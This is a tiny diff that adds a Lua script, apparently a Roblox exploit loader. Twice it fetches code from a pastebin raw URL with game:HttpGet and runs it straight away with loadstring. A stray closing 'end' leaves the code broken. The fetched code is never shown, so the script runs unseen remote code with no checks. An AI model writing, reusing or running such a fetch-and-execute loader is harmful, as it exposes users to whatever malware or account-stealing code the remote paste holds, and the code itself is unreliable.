@@ -1,0 +1,7 @@
+local script1 = game:HttpGet('https://pastebin.com/raw/haDFz2dK')
+loadstring(script1)()
+ 
+local script2 = game:HttpGet('https://pastebin.com/raw/MWucQZv0')
+loadstring(script2)()
+
+end
